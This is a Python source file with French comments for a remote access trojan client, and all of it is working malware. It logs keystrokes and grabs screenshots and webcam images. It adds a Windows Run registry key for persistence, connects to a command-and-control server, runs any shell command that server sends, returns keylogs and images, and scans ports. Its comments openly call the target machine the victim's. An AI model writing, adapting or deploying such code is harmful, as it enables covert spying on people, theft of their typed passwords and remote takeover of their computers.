import os
import socket
import subprocess
import threading
from pynput import keyboard
import pyautogui
import io
import cv2
import sys
import winreg as reg

ip_address = '127.0.0.1'
port_number = 1234
keylog_file = "keylog.txt"

def start_keylogger():
    """
    Fonction pour démarrer le keylogger
    """
    def on_press(key):
        try:
            with open(keylog_file, "a") as f:
                if hasattr(key, 'char') and key.char is not None:
                    f.write(key.char)
                else:
                    if key == keyboard.Key.space:
                        f.write(" ")
                    elif key == keyboard.Key.enter:
                        f.write("\n")
                    elif key == keyboard.Key.backspace:
                        f.seek(0, 2)
                        size = f.tell()
                        if size > 0:
                            f.seek(0, 0)
                            data = f.read(size - 1)
                            f.truncate(0)
                            f.write(data)
                    elif key == keyboard.Key.tab:
                        f.write("\t")
                    else:
                        pass
        except Exception as e:
            pass

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def capture_screenshot():
    """
    Capture l'écran de la machine
    """
    screenshot = pyautogui.screenshot()
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)
    return buffer.getvalue()

def capture_webcam_image():
    """
    Capture d'image via la webcam de la machine
    """
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        return None

    ret, frame = cap.read()

    if ret:
        _, buffer = cv2.imencode('.png', frame)
        image_bytes = buffer.tobytes()
        cap.release()
        return image_bytes
    else:
        cap.release()
        return None

def send_image_to_server(cs, image_bytes):
    """
    Envoi de l'image capturée au serveur
    """
    cs.send(str(len(image_bytes)).encode())
    cs.recv(1024)

    cs.sendall(image_bytes)

def add_persistence():
    """
    Ajoute une entrée au registre de Windows pour lancer automatiquement le script au démarrage de Windows.
    """
    try:
        python_path = sys.executable

        script_dir = os.path.dirname(os.path.abspath(__file__))
        script_name = os.path.basename(__file__)

        command = f'cmd.exe /c "cd /d {script_dir} && {python_path} {script_name}"'

        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, "agent", 0, reg.REG_SZ, command)
        reg.CloseKey(reg_key)
    except Exception as e:
        pass

def connect_to_server():
    """
    Fonction pour établir une connexion avec le serveur et traiter les commandes reçues.
    """
    add_persistence()

    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))

    """ Démarre le keylogger dans un thread séparé """
    threading.Thread(target=start_keylogger, daemon=True).start()

    """ Boucle principale pour recevoir et exécuter les commandes """
    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'exit':
                """ Stop le serveur C2 """
                cs.send(b'quit')
                break

            elif command.lower() == 'keylog':
                """ Résultat du keylogger de la machine de la victime """
                try:
                    with open(keylog_file, "r") as f:
                        keylog_content = f.read()
                    cs.send(keylog_content.encode())
                except FileNotFoundError:
                    cs.send(b"Keylog file not found.")

            elif command.lower() == 'screenshot':
                """ Capture d'écran sur la machine de la victime """
                image_bytes = capture_screenshot()
                if image_bytes:
                    send_image_to_server(cs, image_bytes)
                else:
                    cs.send("Échec de la capture de l'écran.".encode('utf-8'))
            elif command.lower() == 'webcam':
                """ Capture caméra sur la machine de la victime """
                image_bytes = capture_webcam_image()
                if image_bytes:
                    send_image_to_server(cs, image_bytes)
                else:
                    cs.send("Échec de la capture de la webcam.".encode('utf-8'))
            elif command.startswith("scan"):
                """ Scanne des ports ouverts """
                parts = command.split()
                if len(parts) != 3:
                    cs.send("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>".encode())
                    continue
                _, start_port, end_port = parts
                open_ports = scan_ports(int(start_port), int(end_port))
                output = f"Ports ouverts sur {ip_address}: {open_ports}"
                cs.send(output.encode())
                continue

            else:
                """ Exécute toute autre commande système """
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output:
                    output = "Commande executée, pas de sortie !."

                cs.send(output.encode())

        except ConnectionResetError:
            print("La connexion avec le serveur a été réinitialisée.")
            break
        except Exception as e:
            cs.send(f"Error: {e}".encode('utf-8'))
            break

    cs.close()

def scan_ports(start_port, end_port):
    """
    Fonction pour scanner des ports dans une plage donnée et retourner ceux qui sont ouverts.
    """
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            pass
    return open_ports

if __name__ == "__main__":
    add_persistence()
    connect_to_server()
